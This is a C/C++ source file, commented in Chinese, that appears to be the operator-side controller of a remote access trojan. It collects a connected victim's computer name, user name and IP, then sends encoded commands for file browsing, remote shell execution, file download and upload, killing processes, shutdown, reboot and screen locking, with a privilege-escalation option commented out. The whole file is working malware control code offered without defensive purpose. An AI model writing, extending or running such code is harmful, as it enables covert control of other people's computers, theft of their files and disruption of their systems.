#include "../tcpSocket/tcpSocke.h"

int process(SOCKET clifd);

int main()
{
	init_Socket();

	SOCKET serfd = CreatServerScoket();

	printf("等待连接...\n");

	SOCKET clifd = accept(serfd, NULL, NULL);	//如果有客户端请求连接
	if (clifd == INVALID_SOCKET)
	{
		//err("accept");
	}
	char buf[BUFSIZ] = { 0 };

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//接受连接成功并输出
	{
		decode(buf);
		printf("%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));//缓冲区初始化，防止重复输出

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//计算机名
	{
		decode(buf);
		printf("计算机名为 :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//用户名
	{
		decode(buf);
		printf("用户名为 :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	if (recv(clifd, buf, BUFSIZ, 0) > 0)//IP地址
	{
		decode(buf);
		printf("IP为  :%s\n", buf);
	}
	memset(buf, 0, sizeof(buf));

	thread th = thread(process, clifd);
	th.detach();
	char beat[20] = { 0 };
	while (true)
	{
		rewind(stdin);
		if (recv(clifd, beat, 20, 0) > 0)
		{
			//decode(beat);
			printf("%s\n", beat);
		}
	}
	close_Socket();
	return 0;
}

int process(SOCKET clifd)
{
	char code[50] = { 0 };
	char sendbuf[BUFSIZ] = { 0 };
	while (true)
	{
		printf("请输入正确的指令: \n");
		printf("输入 -help 获得输入提示：\n\n");
		rewind(stdin);
		scanf("%s", code);//输入并加密指令
		encode(code);
		send(clifd, code, 50, 0);
		decode(code);
		if (!strcmp(code, "-help"))
		{
			printf("\n输入提示\n");
			printf("1. filebrowse:			文件浏览\n");
			printf("2. shell:			执行shell指令\n");
			printf("3. download:			文件下载\n");
			printf("4. upload:			文件上传\n");
			//printf("5. upright:			提权\n");
			printf("6. kill:			杀死进程\n");
			printf("7. shutdown:			关机\n");
			printf("8. reboot:			重启\n");
			printf("9. cancel:			取消关机\n");
			printf("10.lock:			锁屏\n");
		}
		else if (!strcmp(code, "filebrowse"))
		{
			char file[Row] = { 0 };//定义、初始化、输入提示
			char path[50] = { 0 };

			printf("例如输入 'D:' 来获取D盘目录下的所有文件名\n");
			cin >> path;
			encode(path);
			send(clifd, path, 50, 0);
			while (recv(clifd, sendbuf, BUFSIZ, 0) > 0)
			{
				if (sendbuf[0] == 0)
				{
					continue;
				}
				printf("%s\n", sendbuf);
			}
		}
		else if (!strcmp(code, "shell"))
		{
			char shell[BUFSIZ] = { 0 };
			char res[BUFSIZ * 10] = { 0 };
			printf("请输入正确的shell指令: \n");
			printf("如果指令错误，将会刷新，请重新选择shell后再次输入正确的指令.\n");
			rewind(stdin);
			scanf("%s", shell);
			rewind(stdin);
			encode(shell);
			send(clifd, shell, BUFSIZ, 0);
			rewind(stdin);
			if (recv(clifd, res, BUFSIZ * 10, 0) > 0)
			{
				rewind(stdin);
				//decode(res);
				printf("%s\n", res);
			}
			continue;
		}
		else if (!strcmp(code, "download"))
		{
			printf("请输入要下载的文件名:\n");
			rewind(stdin);
			scanf("%s", sendbuf);
			send(clifd, sendbuf, BUFSIZ, 0);
			ZeroMemory(sendbuf, sizeof(sendbuf));
			recv(clifd, sendbuf, BUFSIZ, 0);
			FILE* fp = fopen("D:\\vsfiles\\test\\x64\\Release\\file.txt", "w");
			if (fp == NULL)
			{
				printf("文件打开失败");
				continue;
			}
			int ret = recv(clifd, sendbuf, BUFSIZ, 0);

			int write_length = fwrite(sendbuf, sizeof(char), ret, fp);
			if (write_length < ret)
			{
				printf("文件写入失败!\n");
				continue;
			}
			memset(sendbuf, 0, sizeof(sendbuf));   //清空接收缓存区
			fclose(fp);
			continue;
		}
		else if (!strcmp(code, "upload"))
		{
			printf("请输入要上传的文件名:\n");
			rewind(stdin);
			scanf("%s", sendbuf);
			send(clifd, sendbuf, BUFSIZ, 0);
			FILE* fp = fopen(sendbuf, "r");
			if (fp == NULL)
			{
				printf("打开 %s 文件失败!\n", sendbuf);
			}
			else
			{
				char buffer[BUFSIZ];
				printf("成功打开 %s 文件!\n", sendbuf);
				ZeroMemory(buffer, BUFSIZ);
				int file_block_length = 0;
				//循环将文件file_name(fp)中的内容读取到buffer中
				while ((file_block_length = fread(buffer, sizeof(char), BUFSIZ, fp)) > 0)
				{

					// 发送buffer中的字符串到客户端  
					if (send(clifd, buffer, file_block_length, 0) < 0)
					{
						printf("文件 %s 发送失败!\n", sendbuf);
						break;
					}
					//清空buffer缓存区
					ZeroMemory(buffer, sizeof(buffer));
				}
				fclose(fp);  			//关闭文件描述符fp
				printf("文件 %s 传输成功!\n", sendbuf);
			}
			continue;
		}
		else if (strcmp(code, "kill") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "reboot") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "shutdown") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else if (strcmp(code, "lock") == 0)
		{
			if (recv(clifd, sendbuf, 60, 0) > 0)
			{
				rewind(stdin);
				decode(sendbuf);
				printf("%s\n", sendbuf);
			}
			rewind(stdin);
			continue;
		}
		else
		{
			printf("指令错误\n\n");
			continue;
			rewind(stdin);
		}
		ZeroMemory(code, sizeof(code));
		rewind(stdin);
	}
	return 0;
}